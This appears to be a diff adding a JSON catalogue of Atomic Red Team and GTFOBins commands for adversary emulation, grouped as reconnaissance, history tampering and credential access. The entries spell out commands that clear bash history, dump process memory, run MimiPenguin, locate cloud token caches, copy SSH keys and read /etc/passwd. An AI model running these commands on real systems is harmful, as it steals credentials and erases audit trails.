@@ -1,0 +1,2468 @@
+{
+  "recon": [
+    {
+      "technique": "T1082",
+      "test_name": "List OS Information",
+      "command": "uname -a >> /tmp/T1082.txt\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> /tmp/T1082.txt; fi\nuptime >> /tmp/T1082.txt\ncat /tmp/T1082.txt 2>/dev/null",
+      "cleanup_command": "rm /tmp/T1082.txt 2>/dev/null",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1082",
+      "test_name": "Linux VM Check via Hardware",
+      "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1082",
+      "test_name": "Linux VM Check via Kernel Modules",
+      "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1082",
+      "test_name": "Hostname Discovery",
+      "command": "hostname",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1082",
+      "test_name": "Linux List Kernel Modules",
+      "command": "lsmod\nkmod list\ngrep vmw /proc/modules",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1087.001",
+      "test_name": "Enumerate users and groups",
+      "command": "groups\nid",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    }
+  ],
+  "log_tamper": [
+    {
+      "technique": "T1070.003",
+      "test_name": "Clear Bash history (rm)",
+      "command": "rm ~/.bash_history",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1070.003",
+      "test_name": "Clear Bash history (echo)",
+      "command": "echo \"\" > ~/.bash_history",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1070.003",
+      "test_name": "Clear Bash history (cat dev/null)",
+      "command": "cat /dev/null > ~/.bash_history",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1070.003",
+      "test_name": "Clear Bash history (ln dev/null)",
+      "command": "ln -sf /dev/null ~/.bash_history",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1070.003",
+      "test_name": "Clear Bash history (truncate)",
+      "command": "truncate -s0 ~/.bash_history",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1070.003",
+      "test_name": "Clear history of a bunch of shells",
+      "command": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1070.003",
+      "test_name": "Clear and Disable Bash History Logging",
+      "command": "set +o history\necho 'set +o history' >> ~/.bashrc\n. ~/.bashrc\nhistory -c",
+      "cleanup_command": "sed -i 's/set +o history//g' ~/.bashrc\n. ~/.bashrc\nset -o history",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1070.003",
+      "test_name": "Use Space Before Command to Avoid Logging to History",
+      "command": "hostname\nwhoami",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    }
+  ],
+  "cred_access": [
+    {
+      "technique": "T1003.007",
+      "test_name": "Dump individual process memory with Python (Local)",
+      "command": "sh /tmp/T1003.007.sh\nPID=$(pgrep -n -f \"T1003.007\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON PathToAtomicsFolder/T1003.007/src/dump_heap.py $PID /tmp/T1003.007.bin\ngrep -i \"PASS\" \"/tmp/T1003.007.bin\"",
+      "cleanup_command": "rm -f \"/tmp/T1003.007.bin\"",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1003.007",
+      "test_name": "Capture Passwords with MimiPenguin",
+      "command": "sudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt\ncat /tmp/T1003.007Test3.txt",
+      "cleanup_command": "rm -f /tmp/T1003.007Test3.txt > /dev/null",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1003.008",
+      "test_name": "Access /etc/master.passwd (Local)",
+      "command": "sudo cat /etc/master.passwd > /tmp/T1003.008.txt\ncat /tmp/T1003.008.txt",
+      "cleanup_command": "rm -f /tmp/T1003.008.txt",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1552.001",
+      "test_name": "Extract passwords with grep",
+      "command": "grep -ri password /\nexit 0",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1552.001",
+      "test_name": "Find Azure credentials",
+      "command": "find //.azure -name \"msal_token_cache.json\" -o -name \"accessTokens.json\" -type f 2>/dev/null",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1552.001",
+      "test_name": "Find GCP credentials",
+      "command": "find //.config/gcloud -name \"credentials.db\" -o -name \"access_tokens.db\" -type f 2>/dev/null",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1552.001",
+      "test_name": "Find OCI credentials",
+      "command": "find //.oci/sessions -name \"token\" -type f 2>/dev/null",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1552.003",
+      "test_name": "Search Through Bash History",
+      "command": "cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > ~/loot.txt",
+      "cleanup_command": null,
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1552.004",
+      "test_name": "Discover Private SSH Keys",
+      "command": "find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt\nexit 0",
+      "cleanup_command": "rm /tmp/keyfile_locations.txt",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1552.004",
+      "test_name": "Copy Private SSH Keys with CP",
+      "command": "mkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec cp --parents {} /tmp/art-staging \\;\nexit 0",
+      "cleanup_command": "rm -rf /tmp/art-staging",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1552.004",
+      "test_name": "Copy Private SSH Keys with rsync",
+      "command": "mkdir /tmp/art-staging\nfind / -name id_rsa 2>/dev/null -exec rsync -R {} /tmp/art-staging \\;\nexit 0",
+      "cleanup_command": "rm -rf /tmp/art-staging",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": "T1552.004",
+      "test_name": "Copy the users GnuPG directory with rsync",
+      "command": "mkdir /tmp/GnuPG\nfind / -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} /tmp/GnuPG \\;\nexit 0",
+      "cleanup_command": "rm -rf /tmp/GnuPG",
+      "source": "atomic-red-team",
+      "lab_rewritten": false
+    },
+    {
+      "technique": null,
+      "test_name": "7z (file-read)",
+      "command": "7z a -ttar -an -so /etc/passwd | 7z e -ttar -si -so",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "7z",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "alpine (file-read)",
+      "command": "alpine -F /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "alpine",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "apache2 (file-read)",
+      "command": "apache2 -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "apache2",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "apache2 (file-read)",
+      "command": "apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /etc/passwd'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "apache2",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "apache2ctl (file-read)",
+      "command": "apache2ctl -c 'Include /etc/passwd'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "apache2ctl",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "aria2c (file-read)",
+      "command": "aria2c -i /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "aria2c",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "arp (file-read)",
+      "command": "arp -v -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "arp",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "as (file-read)",
+      "command": "as @/etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "as",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ascii-xfr (file-read)",
+      "command": "ascii-xfr -ns /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ascii-xfr",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ascii85 (file-read)",
+      "command": "ascii85 /etc/passwd | ascii85 --decode",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ascii85",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "aspell (file-read)",
+      "command": "aspell -c /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "aspell",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "aspell (file-read)",
+      "command": "aspell --conf /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "aspell",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "atobm (file-read)",
+      "command": "atobm /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "atobm",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "aws (file-read)",
+      "command": "aws ec2 describe-instances --filter file:///etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "aws",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "base32 (file-read)",
+      "command": "base32 /etc/passwd | base32 --decode",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "base32",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "base58 (file-read)",
+      "command": "base58 /etc/passwd | base58 --decode",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "base58",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "base64 (file-read)",
+      "command": "base64 /etc/passwd | base64 --decode",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "base64",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "basenc (file-read)",
+      "command": "basenc --base64 /etc/passwd | basenc -d --base64",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "basenc",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "basez (file-read)",
+      "command": "basez /etc/passwd | basez --decode",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "basez",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "bash (file-read)",
+      "command": "bash -c 'echo \"$(</etc/passwd)\"'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "bash",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "bbot (file-read)",
+      "command": "bbot -d -cy /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "bbot",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "bconsole (file-read)",
+      "command": "bconsole -c /path/to/file-input",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "bconsole",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": false
+    },
+    {
+      "technique": null,
+      "test_name": "bridge (file-read)",
+      "command": "bridge -b /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "bridge",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "bzip2 (file-read)",
+      "command": "bzip2 -c /etc/passwd | bzip2 -d",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "bzip2",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "cat (file-read)",
+      "command": "cat /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "cat",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "check_cups (file-read)",
+      "command": "check_cups --extra-opts=@/etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "check_cups",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "check_log (file-read)",
+      "command": "check_log -F /etc/passwd -O /dev/stdout",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "check_log",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "check_memory (file-read)",
+      "command": "check_memory --extra-opts=@/etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "check_memory",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "check_raid (file-read)",
+      "command": "check_raid --extra-opts=@/etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "check_raid",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "check_statusfile (file-read)",
+      "command": "check_statusfile /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "check_statusfile",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "cmake (file-read)",
+      "command": "cmake -E cat /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "cmake",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "cmp (file-read)",
+      "command": "cmp /etc/passwd /dev/zero -b -l",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "cmp",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "column (file-read)",
+      "command": "column /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "column",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "comm (file-read)",
+      "command": "comm /etc/passwd /dev/null",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "comm",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "cp (file-read)",
+      "command": "cp /etc/passwd /dev/stdout",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "cp",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "cpio (file-read)",
+      "command": "echo /etc/passwd | cpio -o",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "cpio",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "csvtool (file-read)",
+      "command": "csvtool trim t /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "csvtool",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "cupsfilter (file-read)",
+      "command": "cupsfilter -i application/octet-stream -m application/octet-stream /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "cupsfilter",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "curl (file-read)",
+      "command": "curl file:///etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "curl",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "cut (file-read)",
+      "command": "cut -d '' -f1 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "cut",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "date (file-read)",
+      "command": "date -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "date",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "dialog (file-read)",
+      "command": "dialog --textbox /etc/passwd 0 0",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "dialog",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "diff (file-read)",
+      "command": "diff --line-format=%L /dev/null /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "diff",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "diff (file-read)",
+      "command": "diff --recursive /path/to/empty-dir /path/to/input-dir/",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "diff",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": false
+    },
+    {
+      "technique": null,
+      "test_name": "dig (file-read)",
+      "command": "dig -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "dig",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "dmesg (file-read)",
+      "command": "dmesg -rF /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "dmesg",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "dos2unix (file-read)",
+      "command": "dos2unix -f -O /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "dos2unix",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "dosbox (file-read)",
+      "command": "dosbox -c 'mount c /' -c 'type c:\\path\\to\\input'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "dosbox",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": false
+    },
+    {
+      "technique": null,
+      "test_name": "efax (file-read)",
+      "command": "efax -d /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "efax",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "egrep (file-read)",
+      "command": "grep '' /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "egrep",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "elvish (file-read)",
+      "command": "elvish -c 'print (slurp </etc/passwd)'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "elvish",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "eqn (file-read)",
+      "command": "eqn /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "eqn",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "espeak (file-read)",
+      "command": "espeak -qXf /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "espeak",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "expand (file-read)",
+      "command": "expand /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "expand",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "expect (file-read)",
+      "command": "expect /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "expect",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "fastfetch (file-read)",
+      "command": "fastfetch --file /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "fastfetch",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "file (file-read)",
+      "command": "file -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "file",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "file (file-read)",
+      "command": "file -m /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "file",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "find (file-read)",
+      "command": "find /etc/passwd -exec cat {} \\;",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "find",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "fmt (file-read)",
+      "command": "fmt -pNON_EXISTING_PREFIX /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "fmt",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "fmt (file-read)",
+      "command": "fmt -999 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "fmt",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "fold (file-read)",
+      "command": "fold -w999 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "fold",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "fping (file-read)",
+      "command": "fping -f /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "fping",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "gawk (file-read)",
+      "command": "gawk '//' /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "gawk",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "gcc (file-read)",
+      "command": "gcc -x c -E /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "gcc",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "gcc (file-read)",
+      "command": "gcc @/etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "gcc",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "genisoimage (file-read)",
+      "command": "genisoimage -q -o - /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "genisoimage",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "genisoimage (file-read)",
+      "command": "genisoimage -sort /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "genisoimage",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "git (file-read)",
+      "command": "git diff /dev/null /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "git",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "gzip (file-read)",
+      "command": "gzip -c /etc/passwd | gzip -d",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "gzip",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "head (file-read)",
+      "command": "head -c-0 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "head",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "hexdump (file-read)",
+      "command": "hd /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "hexdump",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "highlight (file-read)",
+      "command": "highlight --no-doc --failsafe /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "highlight",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "iconv (file-read)",
+      "command": "iconv -f 8859_1 -t 8859_1 /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "iconv",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ip (file-read)",
+      "command": "ip -force -batch /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ip",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "join (file-read)",
+      "command": "join -a 2 /dev/null /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "join",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "jq (file-read)",
+      "command": "jq -Rr . /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "jq",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "julia (file-read)",
+      "command": "julia -e 'print(open(f->read(f, String), \"/etc/passwd\"))'",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "julia",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
+      "test_name": "ksshell (file-read)",
+      "command": "ksshell -i /etc/passwd",
+      "cleanup_command": null,
+      "source": "gtfobins",
+      "gtfobins_binary": "ksshell",
+      "gtfobins_function": "file-read",
+      "lab_rewritten": true
+    },
+    {
+      "technique": null,
